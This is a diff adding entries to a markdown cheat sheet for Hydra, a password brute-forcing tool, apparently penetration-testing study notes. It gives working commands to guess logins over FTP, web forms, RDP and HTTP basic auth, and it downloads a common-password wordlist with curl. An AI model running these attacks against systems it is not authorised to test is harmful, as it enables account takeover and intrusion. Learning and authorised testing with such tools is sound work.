@@ -58,3 +58,12 @@ Hydra is a fast network login cracker that supports numerous attack protocols. I
 **Testing FTP Credentials on Non-standard Port :** `hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp`
 **Brute-forcing Web Login Form :** `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"`
 **Advanced RDP Brute-forcing :** `hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp`
+
+## Basic HTTP Authentication
+`curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt` : To download the wordlist
+
+To use Hydra for the Authentication : `hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt <ip-address> http-get / -s <port_number>`
+
+## Login Forms
+`hydra [options] target http-post-form "path:params:condition_string"` : 
+
